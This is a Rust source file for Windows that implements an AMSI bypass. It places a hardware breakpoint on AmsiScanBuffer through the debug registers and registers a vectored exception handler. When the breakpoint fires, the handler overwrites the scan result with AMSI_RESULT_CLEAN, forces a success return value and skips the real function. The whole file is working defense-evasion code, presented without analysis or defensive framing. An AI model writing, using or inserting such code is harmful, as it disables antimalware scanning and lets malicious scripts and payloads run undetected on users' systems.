use std::ffi::c_void;
use tracing::{debug, error};
use windows_sys::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, CONTEXT, EXCEPTION_POINTERS, GetThreadContext, SetThreadContext,
};
use windows_sys::Win32::System::Threading::GetCurrentThread;

const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;

static mut TARGET_ADDR: usize = 0;

const CONTEXT_AMD64: u32 = 0x100000;
const CONTEXT_DEBUG_REGISTERS: u32 = CONTEXT_AMD64 | 0x10;

pub fn enable_hw_breakpoint(address: usize) -> bool {
    unsafe {
        TARGET_ADDR = address;

        if AddVectoredExceptionHandler(1, Some(veh_handler)).is_null() {
            error!("failed to add vectored exception handler");
            return false;
        }

        let thread = GetCurrentThread();
        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

        if GetThreadContext(thread, &mut context) == 0 {
            error!("failed to get thread context");
            return false;
        }

        context.Dr0 = address as u64;
        context.Dr7 = (context.Dr7 & !0x000F0003) | 0x00000001; // Enable Dr0, local, execution

        if SetThreadContext(thread, &context) == 0 {
            error!("failed to set thread context");
            return false;
        }

        debug!(addr = ?(address as *const c_void), "hardware breakpoint set for current thread");
        true
    }
}

unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let record = &*(*exception_info).ExceptionRecord;
        let context = &mut *(*exception_info).ContextRecord;

        if record.ExceptionCode as u32 == EXCEPTION_SINGLE_STEP
            && record.ExceptionAddress as usize == TARGET_ADDR
        {
            let amsi_result_ptr_addr = context.Rsp + 0x30;
            let amsi_result_ptr = *(amsi_result_ptr_addr as *const *mut u32);
            if !amsi_result_ptr.is_null() {
                *amsi_result_ptr = 0; // AMSI_RESULT_CLEAN
            }

            context.Rax = 0;

            let return_addr = *(context.Rsp as *const u64);
            context.Rip = return_addr;
            context.Rsp += 8;

            debug!("HW BP triggered at AmsiScanBuffer: redirected execution and returned S_OK");
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    EXCEPTION_CONTINUE_SEARCH
}
